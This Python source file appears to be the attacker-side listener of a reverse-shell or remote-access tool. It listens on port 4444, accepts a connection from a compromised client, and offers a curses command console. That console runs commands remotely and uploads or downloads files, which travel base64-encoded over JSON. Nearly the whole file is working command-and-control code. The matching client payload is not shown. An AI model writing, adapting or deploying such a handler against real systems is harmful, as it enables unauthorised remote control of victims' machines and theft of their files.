#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import traceback
import socket
import json
import base64
import curses
# import time

class Listr:

    comm = ""
    lt_comm_ = []
    idx = 0

    cli_pad_y = 5000 # Column size

    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing
    

    def main_curses(self):
        curses.wrapper(self.run)


    def send_data(self, data):
#        print("\ntype: " + str(type(data)) + " - data: " + str(data) + "\n") #testing
        json_data = json.dumps(data)
#        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.sendall(json_data.encode())


    def rcve_data(self):
        json_data = ""
        while True:
            try:
#                print("exit 0") #testing
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
#                   print("break: " + str(json_data)) #testing
                    break
#               print("exit 1" + " - json_data: " + str(json_data)) #testing
                return json.loads(json_data)
            except ValueError:               
                continue


    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()


    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nDownloaded"
    

    def r_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()


    def run(self, cole):
        scrl_comm__ = -1 # To scroll commands sent
        scrl_stor__ = False
        right_left = 0 # Index to go through the string that is typed (buff_ch)
        stor = ""
        buff_ch = ""
        output_comm__ = ""
        buff_com = [''] # story commands
        cur_yx__ = [0, 0] # Store the cursor's position
        (coley, colex) = cole.getmaxyx()
        cli_p = curses.newpad(self.cli_pad_y, colex - 3)
        cli_p.scrollok(True)
        cli_p.idlok(True)
        cli_p.keypad(True)
        # cli_p.border()

        cli_p_me_bar = curses.newpad(1, colex - 1)
        cli_p_me_bar.keypad(True)
        cli_p_me_bar.border(curses.ACS_HLINE)
        curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_WHITE)
        curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_WHITE)
        curses.init_pair(4, curses.COLOR_BLACK, curses.COLOR_WHITE)

        try:
            cli_p.clear()
            cli_p.addstr(self.cli_pad_y - coley, 0, str(self.addrs) + "$ " + buff_ch)
            (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position

            while True:
                              
                # Bottom bar
                self.me_bar__(cli_p_me_bar, coley, colex, scrl_stor__)

                cli_p.move(cur_yx__[0], cur_yx__[1]) # Sending the cursor onto its last position

                cli_p.refresh(self.cli_pad_y - coley, 0, 0, 0, coley - 2, colex - 3)

                 

                #Capturing the input
                # The main 'enter' key retrieve 10, whereas the another 'enter' key 343 which
                # is the value that's working. (??)
                # Using get_wch make use of capturing a wide form of charater, that includs the special ones.
                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 or input == '\n' else input)(cli_p.get_wch())
                ## Testing purpose to check the entries
                # cli_p.addstr(cur_yx__[0], cur_yx__[1], str(inp_ch))
                # continue
                
                # Handling the scroll
                if (inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN) and scrl_stor__:
                    inp_ch = self.app_k__(cli_p, self.cli_pad_y - coley, inp_ch, coley, colex)
                if inp_ch == curses.KEY_F9:
                    scrl_stor__ = True if scrl_stor__ == False else False
                    continue

                # Checking if the size of the windows changed
                (coley_c, colex_c) = cole.getmaxyx()
                if coley_c != coley or colex_c != colex:
                    (coley, colex) = (coley_c, colex_c)
                    # cli_p.addstr("testing... rezising")
                    cli_p.resize(self.cli_pad_y, colex - 3)
                    cole.clear()
                    cole.refresh()
                    cli_p.clear()
                    cli_p.addstr(self.cli_pad_y - coley, 0, stor)

                # Scrolling commands
                elif inp_ch == curses.KEY_UP and not scrl_stor__:
                    # "-2" because the index of an array start with 0, and the first item in the array is empty '' that's why -1
                    if scrl_comm__ < len(buff_com) - 1 and len(buff_com) > 1:
                        if scrl_comm__ < len(buff_com) - 2 : scrl_comm__ += 1
                        buff_ch = buff_com[scrl_comm__]
                        cur_yx__[1] = len(str(self.addrs) + '$ ') + len(buff_ch) # Length of the default line

                elif inp_ch == curses.KEY_DOWN and not scrl_stor__:
                    if scrl_comm__ > -1:
                        if scrl_comm__ > 0: scrl_comm__ -= 1
                        buff_ch = buff_com[scrl_comm__]
                        cur_yx__[1] = len(str(self.addrs) + '$ ') + len(buff_ch) # Length of the default line
                
                # Handling left and right arrows keys to go through the string that is typed (buff_ch)
                elif inp_ch == curses.KEY_LEFT:
                    if right_left > -len(buff_ch):
                        right_left -= 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] - 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue
                elif inp_ch == curses.KEY_RIGHT:
                    if right_left < 0:
                        right_left += 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] + 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue

                # Handlig storory and command execution
                elif inp_ch == curses.KEY_ENTER:
                    # Managing the output storory and clear up the cli
                    if len(buff_ch.replace(' ', '')) > 0:
                        buff_com[:0] = [buff_ch] # buff_com is the story commands, which will be scrolled.
                    if buff_ch == 'clear': # To celar the screen
                        cli_p.clear()
                        buff_com = ['']
                        cli_p.addstr(self.cli_pad_y - coley, 0, str(self.addrs) + "$ ")
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    else: # To execute command and create the story
                        output_comm__ = '\n\n' + self.s_comm__(buff_ch).replace('\r', '')
                        stor += '\n' + str(self.addrs) + "$ " + buff_ch + output_comm__
                        cli_p.addstr(cli_p.getyx()[0], cur_yx__[1], output_comm__ + '\n' + str(self.addrs) + "$ ")
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position

                        # To create space for cli_p_me_bar__
                        if cli_p.getyx()[0] >= cli_p.getmaxyx()[0] - 2:
                            cli_p.addstr(cur_yx__[0], cur_yx__[1], '\n\n')
                            # From the bottom to up 3 rows to set the cursor in its correct position.
                            # This is because the line can't end in the last two row.
                            cur_yx__[0] = cli_p.getmaxyx()[0] - 3
                            cli_p.move(cur_yx__[0], cur_yx__[1]) # Restart cursor's position
                            
                    buff_ch = ''
                    scrl_comm__ = 0
                    right_left = 0 # Restart the cursor's index
                    continue

                elif inp_ch == curses.KEY_BACKSPACE:
                    if cur_yx__[1] > len(str(self.addrs) + "$ "):
                        if right_left < 0 and right_left > -len(buff_ch):
                            # Remove a character. First, checking if the cursor's index (right_left) has been modify and is not as less as buff_ch
                            # The for loop with the parameters given is working between the "minus" length of buff_ch to -1. 
                            # It is given 0 into ranege, however the loop just reach until -1.
                            buff_ch = ''.join([buff_ch[i] for i in range(-len(buff_ch), 0) if i != right_left - 1])
                        elif len(buff_ch) > 0:
                            # If the (right_left) cursor's index equal 0 so means hasn't been modified.
                            buff_ch = buff_ch[:-1]
                        cur_yx__[1] -= 1 # By every backspace the cursor goes back one position
                # Receiving normal char
                # Make sure the inputs are not special characters.
                elif type(inp_ch) is str and len(inp_ch) == 1:
                    # Make sure the new chars are character between 127 to 31 in ASCII table.
                    if ord(inp_ch) < 127 and ord(inp_ch) > 31:
                        if len(buff_ch) > 0 and right_left < 0:
                            buff_ch = buff_ch[:right_left] + inp_ch + buff_ch[right_left:]
                        else:
                            buff_ch += inp_ch
                        cur_yx__[1] += 1 # By every new char the cursor goes forward one position

                cli_p.deleteln()
                cli_p.addstr(cli_p.getyx()[0], 0, str(self.addrs) + "$ " + buff_ch)
                # cli_p.move(cur_yx__[0], cur_yx__[1]) # Sending the cursor onto its current position
                
        except curses.error as cur_err:
            print(cur_err)

    
    def me_bar__(self, pad, coley, colex, ena_scrl):
        pad.deleteln()
        if ena_scrl:
            pad.addstr(0, 0, "Press F9 key to disable scroll: ", curses.color_pair(4))
            pad.addstr(0, pad.getyx()[1], "scroll on", curses.color_pair(3))
        else:
            pad.addstr(0, 0, "Press F9 key to enable scroll: ", curses.color_pair(4))
            pad.addstr(0, pad.getyx()[1], "scroll off", curses.color_pair(2))
        pad.refresh(0, 0, coley - 1, 0, coley - 1, colex - 1)


    def s_comm__(self, comm):
        try:
            self.comm = comm.split(" ")
            # Here, the file is appended to the file.
            if self.comm[0] == "upload":
                self.comm.append(self.r_f(self.comm[1]))
            result = self.exe_rmy(self.comm)
            # while is to make sure if there is still connection
            while result == None:
                result = self.exe_rmy(self.comm)
            if self.comm[0] == "download" and "[Bad command]" not in result:
                result = self.w_f(self.comm[1], result.encode())
            if "exit" in comm:
                self.send_data("test...")
            return result
        except FileNotFoundError as notfound:
            print(f"\n{notfound.strerror}\n")
        except (BrokenPipeError, ConnectionError) as cnerr:
            print(cnerr.strerror + " - Connection down")
            self.conn.close()
            exit()
        except Exception as excep:
            print("Something went wrong. >>> " + str(excep))


    # scrolling
    def app_k__(self, cli_p, row, input_, y, x):
        max_row = row
        curses.curs_set(0)
        while True:
            if input_ == curses.KEY_UP:
                if row > 0:
                    row -= 1
            elif input_ == curses.KEY_DOWN:
                if row < max_row:
                    row += 1
            cli_p.refresh(row, 0, 0, 0, y - 3, x - 3)
            input_ = cli_p.get_wch()
            if input_ != curses.KEY_UP and input_ != curses.KEY_DOWN:
                break
        curses.curs_set(1)
        return input_
    

    # def rwl_ku__(self):
    #     if self.idx < len(self.lt_comm_):
    #         print(*self.lt_comm_[self.idx]), print("\b\b\b\b"),
    #         #keyboard.write("\b\b\b\b\b\b\b\b" + ' '.join(self.lt_comm_[self.idx]), delay=0.0)
    #         #print(' '.join(self.lt_comm_[self.idx]) + " up-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
    #         self.idx = self.idx + 1
    

    # def rwl_kd__(self):
    #     if self.idx > 0:
    #         self.idx = self.idx - 1
    #         print(' '.join(self.lt_comm_[self.idx]), end=" ")
    #         # keyboard.write("\b" + ' '.join(self.lt_comm_[self.idx]))
    #         #print(self.lt_comm_[self.idx] + " down-> " + str(self.idx) + " - len: " + str(len(self.lt_comm_)))
    #     elif self.idx == 0:
    #         #keyboard.write("\b\b")
    #         print('\r', end=" ")
            
try:
    my_listner = Listr('', 4444)
    my_listner.main_curses()
except Exception:
    print(traceback.format_exc())